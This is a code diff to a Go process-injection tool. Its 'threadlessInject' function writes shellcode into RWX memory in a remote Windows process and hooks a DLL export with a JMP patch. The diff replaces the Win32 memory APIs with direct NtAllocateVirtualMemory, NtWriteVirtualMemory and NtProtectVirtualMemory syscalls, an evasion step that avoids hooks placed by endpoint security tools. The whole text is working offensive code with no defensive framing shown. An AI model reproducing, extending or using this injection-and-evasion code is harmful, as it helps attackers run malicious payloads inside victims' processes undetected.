@@ -55,21 +55,16 @@ func threadlessInject(pid uint32, dllName, exportName string, shellcode []byte) 
 	// We patch the restore-and-jump stub at runtime with the correct addresses.
 	payload, resumeStub := buildThreadlessPayload(shellcode, origBytes, hookAddr)
 
-	// Allocate remote memory for payload.
-	remoteMem, _, e2 := procVirtualAllocEx.Call(
-		uintptr(hProc), 0, uintptr(len(payload)),
-		uintptr(memCommit|memReserve), uintptr(pageExecuteReadWrite),
-	)
-	if remoteMem == 0 {
-		return fmt.Errorf("VirtualAllocEx: %v", e2)
+	// Allocate remote memory via NtAllocateVirtualMemory direct syscall.
+	remoteMem, err := ntAlloc(hProc, uintptr(len(payload)), pageExecuteReadWrite)
+	if err != nil {
+		return err
 	}
 
-	// Write payload into remote process.
-	var written uintptr
-	if err := windows.WriteProcessMemory(hProc, remoteMem,
-		&payload[0], uintptr(len(payload)), &written); err != nil {
-		procVirtualFreeEx.Call(uintptr(hProc), remoteMem, 0, uintptr(memRelease))
-		return fmt.Errorf("WriteProcessMemory(payload): %w", err)
+	// Write payload via NtWriteVirtualMemory direct syscall.
+	if err := ntWrite(hProc, remoteMem, payload); err != nil {
+		ntFree(hProc, remoteMem)
+		return fmt.Errorf("payload write: %w", err)
 	}
 
 	// Calculate the JMP target: remoteMem (start of shellcode) relative to hookAddr+5.
@@ -78,15 +73,14 @@ func threadlessInject(pid uint32, dllName, exportName string, shellcode []byte) 
 		byte(jmpOffset), byte(jmpOffset >> 8),
 		byte(jmpOffset >> 16), byte(jmpOffset >> 24)}
 
-	// Flip export page to RW, write the JMP hook, restore RX.
-	var oldProtect uint32
-	procVirtualProtect.Call(hookAddr, 5, uintptr(pageReadWrite), uintptr(unsafe.Pointer(&oldProtect)))
+	// Flip export page to RW via NtProtectVirtualMemory, write the JMP, restore RX.
+	oldProtect, _ := ntProtect(hProc, hookAddr, 5, pageReadWrite)
 	if err := writeRemoteBytes(hProc, hookAddr, jmpPatch[:]); err != nil {
-		procVirtualProtect.Call(hookAddr, 5, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
-		procVirtualFreeEx.Call(uintptr(hProc), remoteMem, 0, uintptr(memRelease))
-		return fmt.Errorf("WriteProcessMemory(hook): %w", err)
+		ntProtect(hProc, hookAddr, 5, oldProtect) //nolint:errcheck
+		ntFree(hProc, remoteMem)
+		return fmt.Errorf("hook write: %w", err)
 	}
-	procVirtualProtect.Call(hookAddr, 5, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
+	ntProtect(hProc, hookAddr, 5, oldProtect) //nolint:errcheck
 
 	_ = resumeStub // embedded in payload already
 	return nil
